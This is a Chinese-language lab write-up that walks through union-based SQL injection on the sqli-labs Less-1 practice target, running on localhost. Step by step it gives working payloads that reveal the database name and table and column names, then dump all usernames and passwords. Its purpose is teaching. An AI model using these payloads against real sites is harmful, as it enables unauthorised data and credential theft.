> 参考资料：[https://www.jianshu.com/p/b5ab19751955](https://www.jianshu.com/p/b5ab19751955)
>
> 这里使用docker进行环境搭建，为了方便这里使用hackbar
>

首先随便输点东西：`http://localhost:8888/Less-1?id=1`

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1641707009614-9d04815a-6cc4-4943-8182-7370fa2c42b3.png)

这里先探测一下注入的类型--是字符型注入还是数字型注入，输入：`http://localhost:8888/Less-1?id=1'`发生报错：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1641707126201-1a16626e-8d03-482a-a42f-4f36486991ac.png)

这句话的大致意思是出现语法错误，其`'1'' LIMIT 0,1`值得引起我们的注意（外面额外的单引号是引起我们注意的意思），其中的`1'`是我们输入的id参数，进一步推出`'$id' LIMIT 0,1`，所以这里可以发生**字符型**注入，并根据回显的内容可以猜测查询语句大致的结构如下：

```sql
select username,password from table_name where id='$GET['id']' limit 0,1
```

> limit子句用于规定要返回的记录的数目：
>
> + select * from table_name limit 3——返回前3条
> + select * from  table_name limit 1,2——返回索引1开始的前2条（索引从0开始）
>

当然了可以再进一步进行确定：`http://localhost:8888/Less-1/?id=1''`不会发生报错：

```php
$sql="SELECT username,password FROM table_name WHERE id='1''' LIMIT 0,1";
```

`select username,password from table_name where id='1''' limit 0,1`引号可以发生闭合。

> 引号闭合的意思是引号成对出现，比如C语言中的字符`'A'`不能写为`'A`或`A'`。（不太恰当，理解到意思就行）
>
> **在php语句中'$GET['id']'必须使用引号括起来，这是php的语法；对应的SQL语句这里没有双引号**
>

下面开始测试是否存在注入点，传入参数`?id=-1' or '1' = '1' --+`，这里要介绍下SQL语句中的注释符：

+ 单行注释可以使用`#`注释符，`#`注释符后直接加注释内容
+ 单行注释可以使用`--`注释符，`--`注释符后需要加一个`空格`，注释才能生效。
+ 多行注释使用`/* */`注释符。`/*`用于注释内容的开头，`*/`用于注释内容的结尾。

> 注释可以写在任何 SQL 语句当中，且 SQL 语句中对注释的数量没有限制。
>

但是在URL中在使用`-- `需要写为`--+或--%20（都可以使用，只是编码的协议不同，前者为W3C标准，后者为RFC 2396规范）`，比如：`http://localhost:8888/Less-1/?id=-1' or '1' = '1' -- `会出现错误，这是因为浏览器在解析URL时会忽略末尾的空格，我们需要写为：

`http://localhost:8888/Less-1/?id=-1' or '1' = '1' --+`

或

`http://localhost:8888/Less-1/?id=-1' or '1' = '1' --%20`

如下所示：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1641709646354-91f1b8e8-a32e-46a0-8aed-5b3651ad1d3f.png)

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1641709678440-b66fedf9-d948-4fcb-9a83-61f1922530f8.png)

以`http://localhost:8888/Less-1/?id=-1' or '1' = '1' --+`为例，执行的SQL语句为：

```sql
select username,password from table_name where id = '-1' or '1' = '1' -- ' limit 0,1
```

实际上有意义的只有`select username,password from table_name where id='<u>-1' or '1' = '1'</u>`，引号闭合，不会报错。其中的`id = '-1'`肯定是没有的查询结果的，为假；但是后面的`<u>'1' = '1'</u>`是一个永真的条件，因为前面是`or`，所以`id = '<u>-1' or '1' = '1'</u>`永真，这意味着执行的语句为`select username,password from table_name where true`，这样会**<font style="color:#E8323C;">返回所有的结果</font>**。注意因为在php中并没有循环遍历输出，所以我们在页面上只能看到一个结果：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1641710576785-e6c2a82b-eabe-40c1-b6f7-da66de57d5cd.png)

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1641710819367-6300b943-53eb-4c93-9de6-8b8fcbce162a.png)

现在我们已经找到了注入点`?id=-1' or '1' = '1' --+`，接下来是利用`order by`和`union`子句找出这个表中的字段：`?id=1' order by 1 --+`，实际上是执行：

```sql
select username,password from table_name where id = '1' order by 1 -- ' limit 0,1
```

> order by关键字用于对结果集按照一个列或者多个列进行排序。经常使用的order by num是省略了字段名称直接使用num数字来代替相应位置的字段名称，**但这种方式只使用在查询中带有字段名和这种查询方式。**
>

没有报错，继续执行，当执行到`?id=1' order by 4 --+`时发生报错，说明这个表中有3个字段也就是3列内容：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1641711442349-dbee0445-af60-4ec0-9b1f-8fbef07a9b1f.png)

现在有3个字段，需要知道这三个字段分别是什么，下面使用到了`union`联合查询。该查询的要求之一为<u><font style="color:#E8323C;">union内部的</font></u>**<u>每个</u>****<u><font style="color:#E8323C;">select语句（不是表）</font></u>**<u><font style="color:#E8323C;">必须拥有</font></u>**<u><font style="color:#E8323C;">相同数量的列</font></u>**<u><font style="color:#E8323C;">、</font></u>**<u><font style="color:#E8323C;">列也必须拥有相似的数据类型</font></u>**<u><font style="color:#E8323C;">并且</font></u>**<u><font style="color:#E8323C;">每个 SELECT 语句中（不是表）的列的顺序必须相同</font></u>**。该查询的目的是**用于合并两个或多个 SELECT 语句的结果集**。在这里可以执行如下URL进行查询`http://localhost:8888/Less-1/?id=-1' union select 1,2,3 --+`

对应的SQL语句如下：`select username,password from table_name where id = '-1' union select 1,2,3`

> 请注意：上述和文章之前的SQL语句的列名username、password和表名table_name并不知道，这里只是一个例子，所以实际的查询语句也不知道.
>
> 下文中-- 注释符之后的内容就不在写出来了。
>

为了方便讲解，这里写出实际的查询语句：

```sql
select * from users where id = '-1' union select 1,2,3
```

在该语句中由于前面指定了`table_name`后面的`union select`就无需再指定，先来看前半部分语句：`select * from users where id = '-1'`，其执行结果如下：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1641717123483-16879ba4-2c66-4651-81fd-cc8f0e716e90.png)

> 上图为'-1'，但不影响结果
>

返回的是一张有3列的空表，后半部分语句可以写为`select 1,2,3(不是select 1,2,3 from users)`，它会返回与实际内容相同的列，但只有一行：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1641718053930-b45584b0-09a0-43b2-9212-1cbc2c3fd419.png)



因此这个union语句符合SQL语句规范不会报错，union合并之后的结果如下：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1641717923004-8531a339-68bf-4507-84a7-930ad9a771d7.png)

> 上图为'-1'，但不影响结果
>

> `select 1,2,3`实际上没有向任何一个数据库查询数据，即查询命令不指向任何数据库的表。
>
> `select 1,2,3 from users`会返回与实际内容相符的行列值，但列名和内容都被替换为`1,2,3`：
>
> ![](https://cdn.nlark.com/yuque/0/2022/png/574026/1641718286946-4302a7b0-2cc2-45bb-b804-00ecff2a40b0.png)
>

对应网站的执行结果如下：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1641718459368-5eec2380-216c-49fb-977f-d6b23f6229b5.png)

从上面知道存放在表中的name和passwd分别对应该表的第2和第3个字段（此时仍然不知道列名）。下面我们开始爆破**当前语句执行的数据库名**和用户名，这个语句和前一个的结构相同：

`http://localhost:8888/Less-1/?id=-1' union select 1,2,concat_ws('-',user(),database())--+`

+ `select concat('11','22','33')`
    - 输出"112233"
+ concat_ws
    - `select concat_ws('-','11','22','33')`即输出"11-22-33"，第一个参数是其它参数的分隔符。
+ user()
    - `select user()`返回用户名
+ database()
    - `select database()`返回数据库名

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1641719159629-cc3d07af-5a52-43e3-b311-5ff870e59f01.png)



如果网页可以有多个回显时可以使用：`http://localhost:8888/Less-1/?id=-1' union select 1,user(),database()--+`

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1641719226880-d7708279-45aa-4bb2-8343-b2bca2617c99.png)

所以用户名`root`，数据库`security`。爆表名之前需要了解mysql中自动创建的数据库`information_schema`：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1641719418391-11d7e801-7906-46ed-844c-933b6b8ab489.png)

其中有很重要的三张表`schemata`，`tables`和`columns`：

+ `schemata`：存储了mysql中所有数据库的信息，包括数据库名，编码类型等，`show databases`的结果取之此表。

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1641719495545-c326af60-3b7b-4bb5-b73c-99ce102389b2.png)

+ `tables`：存储了mysql中所有数据库的表的信息（索引根据数据库名），`show tables from 数据库名（schema_name）`的结果取之此表：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1641720065651-00a200ab-e950-45fa-8c74-d0584f028a63.png)

> 上图红框中是我们这一小节需要用到的表。
>

+ `columns`：存储了mysql中所有表的字段信息，`show columns from 数据库名（schema_name）.table_name（表名）`的结果取之此表。

`columns`表有column_name（列名）、table_name（表名）和table_schema（所在的数据库名）三个字段，如：



![](https://cdn.nlark.com/yuque/0/2022/png/574026/1641720407804-adaff55f-fb3f-4323-8950-c14cfc6be6ca.png)

我们可以使用如上知识取得语句执行的表名：

`?id=-1' union select 1,2,table_name from information_schema.tables where table_schema='security' --+`

对应数据库的语句为：

`select username,password from table_name where id= '-1' union select 1,2,table_name from information_schema.tables where table_schema='security' --`

实际语句为：

`select * from users where id= '-1' union select 1,2,table_name from <u>information_schema.tables</u> where table_schema='security' --`

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1641720843009-909abd48-0f23-46e9-bacb-71807c05bcbf.png)



![](https://cdn.nlark.com/yuque/0/2022/png/574026/1641720858938-9d0cab25-85cc-4697-a771-2b825a6e045c.png)

由于php的限制这里只能显示第一个**执行语句的所在数据库（security）**的表名，要想查询到其他的需要使用`limit`子句：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1641721117460-fe99ed0a-1580-418b-92e2-23563fea64b3.png)

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1641721129937-ff51dd43-f1b3-412e-855a-0fad159d4091.png)

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1641721146784-0069a30c-31ff-44ab-8699-2a448c47a8de.png)

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1641721271927-6ef729c0-2c04-43d6-8885-f84b47db9b10.png)

`limit 4,4`没有结果，说明只有4个表。通过返回的表名我们猜测users为当前语句所查询的表。上面一个一个limit太麻烦，可以直接使用`group_concat`进行打包输出：

+ `group_concat(column_name)`
    - 将字段的所有数据用`,`连接作为字符串输出

`?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security'--+`

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1641721604651-c2a3ce6a-1a52-4271-ad06-5772ddc6a981.png)

最后爆破这个表中的字段：

`?id=-1' union select 1,2,column_name from information_schema.columns where table_name='users' and table_schema='security' limit 0,1--+`

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1641721726931-3d36baf9-4942-4ce1-803c-af90bd4b9640.png)

直接打包输出：`?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users' and table_schema='security' --+`

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1641721822533-6e113808-3f39-4b07-8253-c39fefee27d1.png)

到现在为止我们才知道user表名中的列名分别为`id`、`username`、`password`，最后爆破数据：

`?id=-1' union select 1,group_concat(username),group_concat(password) from users--+`

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1641721914377-3c723e37-6ef2-4a12-8419-98a79056a9f2.png)

另外，SQLI的第二关是数字型注入，数字型和都是相对php而言的：

```php
第一关部分源码：
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
$result=mysql_query($sql);
第二关部分源码：
// connectivity 
$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";
$result=mysql_query($sql);
```











